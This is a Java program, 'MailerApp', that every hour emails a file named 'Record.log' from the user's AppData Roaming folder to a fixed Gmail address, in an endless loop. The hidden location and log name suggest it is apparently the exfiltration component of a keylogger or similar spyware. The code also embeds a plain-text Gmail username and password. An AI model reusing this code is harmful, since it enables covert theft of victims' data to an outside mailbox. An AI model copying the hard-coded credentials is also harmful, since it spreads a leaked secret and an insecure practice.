package org;

import java.io.*;
import java.util.Date;
import java.util.Properties;
import java.util.concurrent.TimeUnit;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class MailerApp {

	public static void main(String args[]) throws Exception {

		InputStreamReader cin = null;
		final String password = "143vinay143";
		final String username = "addanki.vinay40";
		final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
		String location = System.getenv("SystemDrive") + System.getenv("HOMEPATH") + "\\AppData\\" + "Roaming\\";
		Properties props = System.getProperties();
		props.setProperty("mail.smtp.host", "smtp.gmail.com");
		props.setProperty("mail.smtp.socketFactory.class", SSL_FACTORY);
		props.setProperty("mail.smtp.socketFactory.fallback", "false");
		props.setProperty("mail.smtp.port", "465");
		props.setProperty("mail.smtp.socketFactory.port", "465");
		props.put("mail.smtp.auth", "true");
		Session session = Session.getDefaultInstance(props, new Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, password);
			}
		});
		while (true) {
			try {
				Multipart multipart = new MimeMultipart();
				MimeBodyPart textPart = new MimeBodyPart();
				textPart.setText("Log File", "utf-8");
				MimeBodyPart attachmentPart = new MimeBodyPart();
				DataSource fds = new FileDataSource(location + "Record.log");
				attachmentPart.setDataHandler(new DataHandler(fds));
				attachmentPart.setFileName("First Attachement");
				multipart.addBodyPart(textPart);
				multipart.addBodyPart(attachmentPart);
				Message msg = new MimeMessage(session);
				msg.setFrom(new InternetAddress(username + "@gmail.com"));
				msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse("vinay.addanki540@gmail.com", false));
				msg.setSubject("Hello");
				msg.setContent(multipart);
				msg.setSentDate(new Date());
				Transport.send(msg);
				System.out.println("Message sent.");
			} finally {
				if (cin != null) {
					cin.close();
				}
			}
			TimeUnit.HOURS.sleep(1);
			System.out.println("Done");
		}
	}

}
